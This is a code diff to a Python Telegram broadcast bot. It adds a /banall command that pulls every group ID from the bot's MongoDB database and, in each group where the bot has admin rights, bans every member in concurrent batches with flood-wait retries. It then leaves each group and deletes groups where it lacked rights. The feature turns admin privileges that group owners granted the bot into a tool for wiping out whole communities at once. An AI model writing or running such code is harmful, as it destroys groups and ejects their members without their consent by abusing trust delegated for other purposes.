@@ -36,7 +36,7 @@ app = Client("broadcast_bot", API_ID, API_HASH, bot_token=BOT_TOKEN)
 class BroadcastSystem:
     def __init__(self):
         self.mongo_client = MongoClient(MONGO_URL)
-        self.anon_db = self.mongo_client["Yukki"]
+        self.anon_db = self.mongo_client["Anon"]
         
         self.broadcast_message = None
         self.broadcast_keyboard = None
@@ -330,6 +330,7 @@ async def help_command(client, message: Message):
         "• /stats - Database statistics\n"
         "• /broadcast_stats - Broadcast stats\n"
         "• /clear_failed - Failed chats clear\n"
+        "• /banall - Ban all members in all groups\n"
         "• /help - Ye message\n\n"
         "💡 **Tips:**\n"
         "• Formatting aur buttons preserve honge\n"
@@ -338,6 +339,237 @@ async def help_command(client, message: Message):
     )
     
     await message.reply(help_text)
+
+# Banall System
+class BanallSystem:
+    def __init__(self):
+        self.processed_groups = set()
+        self.ban_stats = {
+            'total_groups': 0,
+            'groups_banned': 0,
+            'total_banned': 0,
+            'groups_left': 0,
+            'groups_removed_from_db': 0,
+            'no_rights': 0
+        }
+    
+    async def check_ban_rights(self, chat_id):
+        """Check if bot has ban rights"""
+        try:
+            bot_member = await app.get_chat_member(chat_id, "me")
+            
+            # Check if admin
+            if bot_member.status not in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
+                return False, "not_admin"
+            
+            # Check ban rights
+            if bot_member.status == ChatMemberStatus.ADMINISTRATOR:
+                if not bot_member.privileges or not bot_member.privileges.can_restrict_members:
+                    return False, "no_ban_rights"
+            
+            return True, "has_rights"
+            
+        except Exception as e:
+            print(f"Error checking rights in {chat_id}: {e}")
+            return False, "error"
+    
+    async def ban_member(self, chat_id, user_id):
+        """Ban single member"""
+        try:
+            await app.ban_chat_member(chat_id, user_id)
+            return True
+        except FloodWait as e:
+            await asyncio.sleep(e.value)
+            return await self.ban_member(chat_id, user_id)
+        except Exception as e:
+            return False
+    
+    async def ban_all_in_group(self, chat_id, status_msg):
+        """Ban all members in a single group"""
+        if chat_id in self.processed_groups:
+            return
+        
+        self.processed_groups.add(chat_id)
+        
+        # Check ban rights
+        has_rights, reason = await self.check_ban_rights(chat_id)
+        
+        if not has_rights:
+            self.ban_stats['no_rights'] += 1
+            print(f"❌ No ban rights in {chat_id}: {reason}")
+            
+            # Leave group
+            try:
+                await app.leave_chat(chat_id)
+                self.ban_stats['groups_left'] += 1
+                print(f"✅ Left group: {chat_id}")
+                
+                # Remove from MongoDB
+                broadcast_system.anon_db.assistants.delete_one({'chat_id': chat_id})
+                broadcast_system.anon_db.chats.delete_one({'chat_id': chat_id})
+                self.ban_stats['groups_removed_from_db'] += 1
+                
+            except Exception as e:
+                print(f"❌ Could not leave group {chat_id}: {e}")
+            
+            return
+        
+        # Ban all members
+        member_count = 0
+        banned_count = 0
+        tasks = []
+        
+        try:
+            # Get chat info
+            try:
+                chat = await app.get_chat(chat_id)
+                chat_title = chat.title if hasattr(chat, 'title') else str(chat_id)
+            except:
+                chat_title = str(chat_id)
+            
+            print(f"\n🔨 Starting banall in: {chat_title}")
+            
+            async for member in app.get_chat_members(chat_id):
+                member_count += 1
+                task = asyncio.create_task(self.ban_member(chat_id, member.user.id))
+                tasks.append(task)
+                
+                # Process in batches of 50
+                if len(tasks) >= 50:
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    banned_count += sum(1 for r in results if r is True)
+                    tasks = []
+                    
+                    # Update status
+                    await status_msg.edit(
+                        f"🔨 **Banall Progress**\n\n"
+                        f"Current Group: {chat_title}\n"
+                        f"Members: {member_count}\n"
+                        f"Banned: {banned_count}\n"
+                        f"Groups Done: {self.ban_stats['groups_banned']}/{self.ban_stats['total_groups']}"
+                    )
+            
+            # Process remaining
+            if tasks:
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                banned_count += sum(1 for r in results if r is True)
+            
+            print(f"✅ Banned {banned_count}/{member_count} members in {chat_title}")
+            
+            self.ban_stats['groups_banned'] += 1
+            self.ban_stats['total_banned'] += banned_count
+            
+            # Leave group after ban
+            await asyncio.sleep(2)
+            try:
+                await app.leave_chat(chat_id)
+                self.ban_stats['groups_left'] += 1
+                print(f"✅ Left group: {chat_title}")
+            except Exception as e:
+                print(f"❌ Could not leave: {e}")
+            
+        except Exception as e:
+            print(f"❌ Error in banall for {chat_id}: {e}")
+    
+    async def start_banall(self, status_msg):
+        """Start banall in all groups"""
+        # Get all groups from MongoDB
+        all_groups = []
+        
+        try:
+            for group in broadcast_system.anon_db.assistants.find({}, {'chat_id': 1}):
+                if 'chat_id' in group and group['chat_id'] < 0:  # Negative IDs are groups
+                    all_groups.append(group['chat_id'])
+            
+            for chat in broadcast_system.anon_db.chats.find({}, {'chat_id': 1}):
+                if 'chat_id' in chat and chat['chat_id'] < 0:
+                    all_groups.append(chat['chat_id'])
+        except Exception as e:
+            print(f"Error fetching groups: {e}")
+        
+        # Remove duplicates
+        all_groups = list(set(all_groups))
+        self.ban_stats['total_groups'] = len(all_groups)
+        
+        if not all_groups:
+            await status_msg.edit("❌ Database me koi group nahi mila!")
+            return
+        
+        await status_msg.edit(
+            f"🔨 **Banall Starting...**\n\n"
+            f"Total Groups: {len(all_groups)}\n"
+            f"⏳ Please wait..."
+        )
+        
+        start_time = time.time()
+        
+        # Process each group
+        for i, group_id in enumerate(all_groups, 1):
+            print(f"\n{'='*50}")
+            print(f"Processing group {i}/{len(all_groups)}: {group_id}")
+            print(f"{'='*50}")
+            
+            await self.ban_all_in_group(group_id, status_msg)
+            
+            # Small delay between groups
+            await asyncio.sleep(2)
+        
+        duration = time.time() - start_time
+        
+        # Final report
+        report = (
+            f"✅ **Banall Complete!**\n\n"
+            f"📊 **Statistics:**\n"
+            f"• Total Groups: {self.ban_stats['total_groups']}\n"
+            f"• ✅ Groups Banned: {self.ban_stats['groups_banned']}\n"
+            f"• 🔨 Total Banned: {self.ban_stats['total_banned']}\n"
+            f"• 🚪 Groups Left: {self.ban_stats['groups_left']}\n"
+            f"• ❌ No Rights: {self.ban_stats['no_rights']}\n"
+            f"• 🗑️ Removed from DB: {self.ban_stats['groups_removed_from_db']}\n"
+            f"• ⏱️ Time: {duration:.1f}s\n\n"
+            f"Success Rate: {(self.ban_stats['groups_banned']/self.ban_stats['total_groups']*100):.1f}%"
+        )
+        
+        await status_msg.edit(report)
+
+# Initialize banall system
+banall_system = BanallSystem()
+
+# Command: /banall
+@app.on_message(filters.command("banall"))
+async def banall_command(client, message: Message):
+    user_id = message.from_user.id
+    
+    if user_id not in ADMIN_IDS:
+        await message.reply("❌ Only admins can use this command!")
+        return
+    
+    # Confirm
+    confirm_msg = await message.reply(
+        "⚠️ **WARNING: BANALL**\n\n"
+        "🔨 Ye command:\n"
+        "• Sabhi groups me members ko ban karega\n"
+        "• Groups me se leave karega\n"
+        "• Jisme rights nahi hai unhe chhod dega\n"
+        "• Database se groups remove karega\n\n"
+        "Type `CONFIRM` to proceed"
+    )
+    
+    try:
+        response = await client.listen(message.chat.id, timeout=30)
+        
+        if response.text and response.text.upper() == 'CONFIRM':
+            await confirm_msg.delete()
+            await response.delete()
+            
+            status_msg = await message.reply("🔨 Banall starting...")
+            await banall_system.start_banall(status_msg)
+        else:
+            await confirm_msg.edit("❌ Banall cancelled!")
+    except asyncio.TimeoutError:
+        await confirm_msg.edit("⏱️ Timeout! Banall cancelled.")
+    except Exception as e:
+        await message.reply(f"❌ Error: {str(e)}")
 
 # Broadcast handler - Koi bhi message forward karo
 @app.on_message(filters.private & ~filters.command(["start", "stats", "broadcast_stats", "clear_failed", "help"]))
